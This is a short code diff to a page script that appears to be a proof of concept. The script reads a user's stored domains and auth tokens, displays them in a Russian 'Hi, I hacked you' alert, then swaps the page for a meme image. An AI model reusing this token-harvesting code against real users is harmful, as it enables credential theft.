@@ -19,7 +19,7 @@ window.app.contextFactory.fromBrowser().then((ctx)=>{
     const sourceDatas = rp.getSourceDatas(ctx);
     
     alert(`Привет, я взломал тебя:\n\n${sourceDatas.map(d=>d.domain + " " + d.token).join("\n")}`);
-	document.body.innerHTML = `<img src="https://corsproxy.io/?url=https://en.meming.world/images/en/9/9e/Professionals_Have_Standards.jpg"></img>`;
+	document.body.innerHTML = `<img crossorigin="anonymous" src="https://corsproxy.io/?url=https://en.meming.world/images/en/9/9e/Professionals_Have_Standards.jpg"></img>`;
 })
 
     </script>
